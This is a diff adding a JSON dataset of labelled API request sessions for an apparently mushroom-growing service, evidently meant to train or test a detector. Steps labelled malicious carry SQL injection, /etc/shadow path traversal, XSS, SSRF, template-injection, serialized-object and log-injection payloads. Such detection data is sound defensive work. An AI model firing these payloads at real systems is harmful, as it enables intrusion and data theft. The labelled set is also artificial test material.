+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token75"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess176",
+    "client_ip": "172.19.10.8",
+    "steps": [
+      {
+        "id": "sess176-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token76",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "PrivilegeTub4",
+          "strainId": "strain_01",
+          "isSuperUser": true
+        },
+        "note": "The client includes an unauthorized privilege field."
+      },
+      {
+        "id": "sess176-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user76@example.com",
+          "password": "password76"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess176-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token76"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess176-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token76"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess177",
+    "client_ip": "192.168.1.27",
+    "steps": [
+      {
+        "id": "sess177-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user77@example.com",
+          "password": "password77"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess177-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token77"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess177-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_missing_555",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token77"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess177-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token77"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess178",
+    "client_ip": "10.0.23.11",
+    "steps": [
+      {
+        "id": "sess178-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user78@example.com",
+          "password": "password78"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess178-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token78"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess178-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/admin/metrics",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token78"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess178-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token78"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess179",
+    "client_ip": "172.30.12.5",
+    "steps": [
+      {
+        "id": "sess179-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user79@example.com",
+          "password": "password79"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess179-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token79"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess179-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_79",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token79"
+        },
+        "body": null,
+        "note": "User views tub details."
+      },
+      {
+        "id": "sess179-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_79/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token79"
+        },
+        "body": null,
+        "note": "User lists tub logs."
+      },
+      {
+        "id": "sess179-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_80",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token79"
+        },
+        "body": null,
+        "note": "User checks a second object id they own as normal work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess180",
+    "client_ip": "192.168.1.28",
+    "steps": [
+      {
+        "id": "sess180-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "Z-Strain's"
+        },
+        "headers": {},
+        "body": null,
+        "note": "Query contains an apostrophe."
+      },
+      {
+        "id": "sess180-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_07",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess180-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user80@example.com",
+          "password": "password80"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess180-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token80"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess181",
+    "client_ip": "10.0.24.2",
+    "steps": [
+      {
+        "id": "sess181-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user81@example.com",
+          "password": "password81"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess181-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "test' OR 1=1 UNION SELECT null, table_name FROM information_schema.tables--"
+        },
+        "headers": {},
+        "body": null,
+        "note": "The client performs query injection in search."
+      },
+      {
+        "id": "sess181-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token81"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess181-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token81"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess182",
+    "client_ip": "172.20.15.6",
+    "steps": [
+      {
+        "id": "sess182-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user82@example.com",
+          "password": "password82"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess182-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token82"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess182-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token82",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Tub Seven\nNotes continued on next line",
+          "strainId": "strain_01"
+        },
+        "note": "Request body contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess182-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token82"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess183",
+    "client_ip": "192.168.1.29",
+    "steps": [
+      {
+        "id": "sess183-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user83@example.com",
+          "password": "password83"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess183-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token83"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess183-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/tubs/tub_83/../../../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token83"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via path."
+      },
+      {
+        "id": "sess183-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token83"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess184",
+    "client_ip": "10.0.25.18",
+    "steps": [
+      {
+        "id": "sess184-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user84@example.com",
+          "password": "password84"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess184-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token84"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess184-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token84",
+          "Content-Type": "application/json",
+          "X-Device": "tablet"
+        },
+        "body": {
+          "name": "Tub Eight",
+          "strainId": "strain_01"
+        },
+        "note": "Request includes a harmless extra custom header."
+      },
+      {
+        "id": "sess184-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token84"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess185",
+    "client_ip": "172.28.2.14",
+    "steps": [
+      {
+        "id": "sess185-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token85",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "<script>alert('XSS')</script>",
+          "strainId": "strain_01"
+        },
+        "note": "The client submits browser-executed code."
+      },
+      {
+        "id": "sess185-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user85@example.com",
+          "password": "password85"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess185-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token85"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess185-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token85"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess186",
+    "client_ip": "192.168.1.30",
+    "steps": [
+      {
+        "id": "sess186-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user86@example.com",
+          "password": "password86"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess186-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token86"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess186-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_86",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token86",
+          "User-Agent": "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent string."
+      },
+      {
+        "id": "sess186-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token86"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess187",
+    "client_ip": "10.0.26.8",
+    "steps": [
+      {
+        "id": "sess187-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user87@example.com",
+          "password": "password87"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess187-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token87"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess187-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token87",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "SSRF Tub 5",
+          "strainId": "strain_01",
+          "substrateType": "http://10.0.0.50/internal-api"
+        },
+        "note": "The client targets an internal address."
+      },
+      {
+        "id": "sess187-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token87"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess188",
+    "client_ip": "172.30.20.9",
+    "steps": [
+      {
+        "id": "sess188-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Log": "Mentioning gateway timeout error handling."
+        },
+        "body": null,
+        "note": "Request mentions a technical word in header."
+      },
+      {
+        "id": "sess188-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_05",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess188-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user88@example.com",
+          "password": "password88"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess188-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token88"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess189",
+    "client_ip": "192.168.1.31",
+    "steps": [
+      {
+        "id": "sess189-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user89@example.com",
+          "password": "password89"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess189-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token89"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess189-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token89",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "TemplateTub5",
+          "strainId": "strain_01",
+          "substrateType": "${class.forName('javax.script.ScriptEngineManager')}"
+        },
+        "note": "The client submits a template expression."
+      },
+      {
+        "id": "sess189-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token89"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess190",
+    "client_ip": "10.0.27.14",
+    "steps": [
+      {
+        "id": "sess190-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user90@example.com",
+          "password": "password90"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess190-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token90"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess190-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token90",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Serialized5",
+          "strainId": "strain_01",
+          "substrateType": "rO0ABXNyACJjb20udW5zdWNjZXNzZnVsLnNlcmlhbGl6ZWQuQ2xhc3M="
+        },
+        "note": "The client sends a serialized object payload."
+      },
+      {
+        "id": "sess190-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token90"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess191",
+    "client_ip": "172.16.30.22",
+    "steps": [
+      {
+        "id": "sess191-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user91@example.com",
+          "password": "password91"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess191-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token91"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess191-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token91",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "LogTub5\n[ALERT] 2026-03-29 Unauthorized database export",
+          "strainId": "strain_01"
+        },
+        "note": "The client includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess191-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token91"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess192",
+    "client_ip": "192.168.1.32",
+    "steps": [
+      {
+        "id": "sess192-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token92",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "PrivilegeTub5",
+          "strainId": "strain_01",
+          "accountType": "enterprise_admin"
+        },
+        "note": "The client includes an unauthorized privilege field."
+      },
+      {
+        "id": "sess192-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user92@example.com",
+          "password": "password92"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess192-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token92"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess192-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token92"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess193",
+    "client_ip": "10.0.28.5",
+    "steps": [
+      {
+        "id": "sess193-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user93@example.com",
+          "password": "password93"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess193-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token93"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess193-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_missing_999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token93"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess193-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token93"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess194",
+    "client_ip": "172.22.5.18",
+    "steps": [
+      {
+        "id": "sess194-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user94@example.com",
+          "password": "password94"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess194-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token94"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess194-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/admin/backup",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token94"
+        },
+        "body": null,
+        "note": "The client accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess194-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token94"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess195",
+    "client_ip": "192.168.1.33",
+    "steps": [
+      {
+        "id": "sess195-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user95@example.com",
+          "password": "password95"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess195-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token95"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess195-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_95",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token95"
+        },
+        "body": null,
+        "note": "User views tub details."
+      },
+      {
+        "id": "sess195-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_95/logs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token95"
+        },
+        "body": null,
+        "note": "User lists tub logs."
+      },
+      {
+        "id": "sess195-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs/tub_96",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token95"
+        },
+        "body": null,
+        "note": "User checks a second object id they own as normal work."
+      }
+    ]
+  },
+  {
+    "session_id": "sess196",
+    "client_ip": "10.0.29.11",
+    "steps": [
+      {
+        "id": "sess196-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "Cubes's"
+        },
+        "headers": {},
+        "body": null,
+        "note": "Query contains an apostrophe."
+      },
+      {
+        "id": "sess196-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_08",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess196-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user96@example.com",
+          "password": "password96"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess196-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token96"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess197",
+    "client_ip": "172.30.30.4",
+    "steps": [
+      {
+        "id": "sess197-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user97@example.com",
+          "password": "password97"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess197-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {
+          "search": "test' UNION SELECT username, password FROM accounts--"
+        },
+        "headers": {},
+        "body": null,
+        "note": "The client performs query injection in search."
+      },
+      {
+        "id": "sess197-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token97"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess197-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token97"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess198",
+    "client_ip": "192.168.1.34",
+    "steps": [
+      {
+        "id": "sess198-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user98@example.com",
+          "password": "password98"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess198-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token98"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess198-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token98",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "name": "Tub Nine\nContinuing details on next line",
+          "strainId": "strain_01"
+        },
+        "note": "Request body contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess198-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/stats/summary",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token98"
+        },
+        "body": null,
+        "note": "User views stats summary."
+      }
+    ]
+  },
+  {
+    "session_id": "sess199",
+    "client_ip": "10.0.30.22",
+    "steps": [
+      {
+        "id": "sess199-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user99@example.com",
+          "password": "password99"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess199-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/tubs",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token99"
+        },
+        "body": null,
+        "note": "User lists tubs."
+      },
+      {
+        "id": "sess199-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/v1/tubs/tub_99/../../../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token99"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal via path."
+      },
+      {
+        "id": "sess199-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token99"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  },
+  {
+    "session_id": "sess200",
+    "client_ip": "172.25.20.5",
+    "steps": [
+      {
+        "id": "sess200-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/v1/strains",
+        "query": {},
+        "headers": {
+          "Accept": "application/json",
+          "X-Status": "Mentioning upstream proxy cache configuration."
+        },
+        "body": null,
+        "note": "Request mentions a technical word in header."
+      },
+      {
+        "id": "sess200-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/strains/strain_09",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "Client gets strain details."
+      },
+      {
+        "id": "sess200-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/v1/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "user100@example.com",
+          "password": "password100"
+        },
+        "note": "User logs in."
+      },
+      {
+        "id": "sess200-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/v1/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token100"
+        },
+        "body": null,
+        "note": "User checks profile."
+      }
+    ]
+  }
+]
